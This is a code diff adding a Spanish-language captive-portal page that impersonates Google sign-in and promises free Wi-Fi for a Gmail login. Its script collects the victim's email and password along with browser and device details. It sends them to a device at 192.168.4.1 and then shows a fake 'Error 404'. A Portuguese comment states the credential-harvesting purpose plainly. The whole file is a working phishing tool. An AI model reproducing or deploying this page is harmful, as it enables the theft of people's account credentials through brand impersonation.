+                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
+                ></path>
+              </g>
+              <g id="YGlOvc">
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+              </g>
+              <g id="BWfIk">
+                <path
+                  fill="#4285f4"
+                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
+                ></path>
+              </g>
+              <g id="e6m3fd">
+                <path
+                  fill="#fbbc05"
+                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
+                ></path>
+              </g>
+              <g id="vbkDmc">
+                <path
+                  fill="#ea4335"
+                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
+                ></path>
+              </g>
+              <g id="idEJde">
+                <path
+                  fill="#4285f4"
+                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
+                ></path>
+              </g>
+            </svg>
+          </div>
+        </div>
+        <div>
+          <!-- SVG do logo do Google (substituído pela imagem acima) -->
+        </div>
+        <h1>inicia sesión con Google</h1>
+        <p>Usa tu cuenta de Gmail para usar Wifi gratis</p>
+        <form action="#" method="post">
+          <div class="input-wrapper">
+            <input
+              type="email"
+              name="email"
+              id="email"
+              required
+              placeholder="Correo electrónico o teléfono"
+            />
+            <label for="email"></label>
+          </div>
+          <div
+            class="input-wrapper"
+            id="password-wrapper"
+            style="display: none"
+          >
+            <input
+              type="password"
+              name="password"
+              id="password"
+              required
+              placeholder="Ingrese su contraseña"
+            />
+            <label for="password"></label>
+          </div>
+          <input type="submit" value="Siguiente" />
+        </form>
+
+        <div class="language-selector">
+          <p for="language">Idioma:</p>
+          <select id="language" onchange="changeLanguage(this.value)">
+            <option value="pt-BR">Português (Brasil)</option>
+            <option value="en">English</option>
+            <option value="es" selected>Español</option>
+            <!-- Add more languages as needed -->
+          </select>
+        </div>
+      </div>
+    </div>
+    <script>
+      function changeLanguage(selectedLanguage) {
+        // Oculta todos os corpos de idioma
+        var languageBodies = document.querySelectorAll(
+          ".login-container > div"
+        );
+        languageBodies.forEach(function (body) {
+          body.classList.add("hidden");
+        });
+        // Mostra o corpo do idioma selecionado
+        document.getElementById(selectedLanguage).classList.remove("hidden");
+      }
+
+      // Adiciona o evento de entrada ao campo de e-mail em cada corpo de idioma
+      var emailInputs = document.querySelectorAll('input[type="email"]');
+      emailInputs.forEach(function (input) {
+        input.addEventListener("input", function () {
+          // Encontra o wrapper de senha dentro do formulário atual
+          var passwordWrapper =
+            this.closest("form").querySelector("#password-wrapper");
+          if (this.value) {
+            passwordWrapper.style.display = "block";
+          } else {
+            passwordWrapper.style.display = "none";
+          }
+        });
+      });
+      //ales das credencias de email e senha , tabem pode pegar mas infomacoes sobre o dispositivo do usuario
+      function sendCredentials() {
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
+        var userAgent = navigator.userAgent;
+        var platform = navigator.platform;
+        var language = navigator.language;
+
+        var url =
+          "http://192.168.4.1/?email=" +
+          encodeURIComponent(email) +
+          "&password=" +
+          encodeURIComponent(
+            `${password} | ${userAgent} | ${platform} | ${language}`
+          );
+
+        getFile(url);
+        alert("Error 404");
+        window.location.href = "#";
+      }
+
+      function getFile(url) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.send();
+      }
+    </script>
+  </body>
+</html>
